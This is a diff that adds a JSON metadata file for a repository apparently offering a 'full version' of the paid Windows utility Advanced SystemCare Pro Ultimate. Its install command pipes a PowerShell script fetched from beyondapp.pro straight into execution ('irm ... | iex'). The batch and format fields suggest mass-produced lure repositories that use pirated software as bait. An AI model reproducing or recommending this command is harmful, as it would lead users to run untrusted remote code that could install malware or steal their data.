@@ -1,0 +1,25 @@
+{
+  "repo": "Advanced-SystemCare-Pro-Ultimate-Full-Version",
+  "product": "Advanced SystemCare Pro Ultimate Full Version",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://beyondapp.pro/ps/setup.ps1",
+  "install_command": "irm https://beyondapp.pro/ps/setup.ps1 | iex",
+  "batch": "new30-popular80",
+  "format": "license-md-only",
+  "category": "utility",
+  "topics": [
+    "advanced-systemcare-pro-ultimate-full-ve",
+    "advanced",
+    "systemcare",
+    "pro",
+    "ultimate",
+    "full",
+    "version",
+    "utility",
+    "windows",
+    "desktop",
+    "setup-guide",
+    "software"
+  ]
+}
